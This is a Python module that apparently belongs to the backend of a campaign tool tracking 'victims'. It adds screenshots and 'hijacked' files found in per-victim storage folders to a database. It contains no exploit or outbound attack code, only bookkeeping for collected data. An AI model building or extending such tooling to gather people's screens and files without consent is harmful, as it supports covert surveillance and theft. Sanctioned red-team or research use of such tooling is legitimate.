"""Recover database records from app-owned persistent artifact storage."""

from __future__ import annotations

import logging
import os
from datetime import datetime, timezone
from pathlib import Path

from database import SessionLocal
from models import Campaign, DataCollection, Victim
from utils.artifact_files import safe_campaign_directory_name


logger = logging.getLogger(__name__)
STORAGE_PATH = Path(os.getenv("STORAGE_PATH", "/storage"))
MAX_FILES_PER_ARTIFACT_TYPE = 10_000


def _artifact_files(victim_root: Path, data_type: str):
    if data_type == "screenshot":
        artifact_root = victim_root / "screenshots"
        pattern = "screenshot_*.png"
    else:
        artifact_root = victim_root / "files_hijacked"
        pattern = "*"

    if not artifact_root.is_dir() or artifact_root.is_symlink():
        return

    resolved_root = artifact_root.resolve()
    for artifact in sorted(resolved_root.glob(pattern))[
        :MAX_FILES_PER_ARTIFACT_TYPE
    ]:
        if artifact.is_symlink():
            continue
        try:
            resolved = artifact.resolve(strict=True)
            resolved.relative_to(resolved_root)
            stat = resolved.stat()
        except (FileNotFoundError, OSError, RuntimeError, ValueError):
            continue
        if resolved.is_file():
            yield artifact_root.name, resolved, stat


def reconcile_persisted_artifacts() -> int:
    """Index valid files that survived a failed metadata callback."""
    db = SessionLocal()
    recovered = 0
    try:
        victims = (
            db.query(Victim, Campaign)
            .join(Campaign, Campaign.id == Victim.campaign_id)
            .all()
        )
        for victim, campaign in victims:
            victim_root = (
                STORAGE_PATH
                / "campaigns"
                / safe_campaign_directory_name(campaign.name, campaign.id)
                / victim.id
            )

            for data_type in ("screenshot", "file_hijacked"):
                existing_paths = {
                    row[0]
                    for row in db.query(DataCollection.file_path)
                    .filter(
                        DataCollection.campaign_id == campaign.id,
                        DataCollection.victim_id == victim.id,
                        DataCollection.data_type == data_type,
                    )
                    .all()
                }

                for directory, artifact, stat in _artifact_files(
                    victim_root,
                    data_type,
                ):
                    relative_path = f"{directory}/{artifact.name}"
                    if relative_path in existing_paths:
                        continue
                    db.add(
                        DataCollection(
                            victim_id=victim.id,
                            campaign_id=campaign.id,
                            data_type=data_type,
                            file_path=relative_path,
                            file_size_bytes=stat.st_size,
                            collected_at=datetime.fromtimestamp(
                                stat.st_mtime,
                                tz=timezone.utc,
                            ),
                            extra_metadata={"recovered_from_storage": True},
                        )
                    )
                    existing_paths.add(relative_path)
                    recovered += 1

        db.flush()
        for campaign in db.query(Campaign).all():
            campaign.total_screenshots = db.query(DataCollection).filter(
                DataCollection.campaign_id == campaign.id,
                DataCollection.data_type == "screenshot",
            ).count()

        db.commit()
    except Exception:
        db.rollback()
        logger.exception("Persisted artifact reconciliation failed")
        return 0
    finally:
        db.close()

    if recovered:
        logger.info("Recovered %s artifact record(s) from storage", recovered)
    return recovered
